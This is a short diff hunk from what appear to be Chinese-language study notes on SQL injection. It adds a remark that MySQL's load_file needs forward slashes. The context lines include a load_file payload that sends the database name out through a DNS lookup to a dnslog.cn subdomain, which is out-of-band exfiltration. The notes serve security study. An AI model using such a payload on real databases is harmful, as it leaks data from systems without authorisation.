@@ -906,7 +906,7 @@ update会修改数据库里原有记录的值,如果select注入只能使用延�
    select load_file("\\\\",database(),".xkpb07.dnslog.cn\\aa");
    ```
 
-
+**需要注意的是windows中的文件资源管理器中的文件目录用的是反斜杠 \ ，而我们的网站中文件的目录索引用的是斜杠 / ，我们这里load_file函数必须用斜杠 / 索引文件**
 
 可不可以通过不受secure_file_priv限制的load data infile 或者 load data local infile 执行dnslog注入
 
